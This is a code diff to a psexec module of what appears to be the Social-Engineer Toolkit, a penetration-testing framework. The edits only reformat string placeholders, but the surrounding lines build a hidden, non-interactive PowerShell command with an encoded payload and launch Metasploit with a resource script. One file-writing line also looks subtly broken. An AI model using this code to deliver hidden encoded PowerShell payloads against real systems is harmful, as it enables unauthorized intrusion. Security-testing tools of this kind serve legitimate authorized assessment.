@@ -1,3 +1,4 @@
+# coding=utf-8
 #############################################
 #
 # Main SET module for psexec
@@ -84,7 +85,7 @@ try:
 
     with open(os.path.join(core.setdir, "x86.powershell")) as fileopen:
         x86 = fileopen.read()
-    x86 = "powershell -nop -window hidden -noni -EncodedCommand {}".format(x86)
+    x86 = "powershell -nop -window hidden -noni -EncodedCommand {0}".format(x86)
     core.print_status("If you want the powershell commands and attack, they are exported to {0}".format(os.path.join(core.setdir, "reports/powershell")))
     with open(os.path.join(core.setdir, "/reports/powershell/x86_powershell_injection.txt", "w")) as filewrite:
         filewrite.write(x86)
@@ -112,8 +113,8 @@ try:
 
     # launch metasploit below
     core.print_status("Launching Metasploit.. This may take a few seconds.")
-    subprocess.Popen("{} -r {}".format(os.path.join(core.meta_path(), "msfconsole"),
-                                       os.path.join(core.setdir, "reports/powershell/powershell.rc")),
+    subprocess.Popen("{0} -r {1}".format(os.path.join(core.meta_path(), "msfconsole"),
+                                         os.path.join(core.setdir, "reports/powershell/powershell.rc")),
                      shell=True).wait()
 
 # handle exceptions
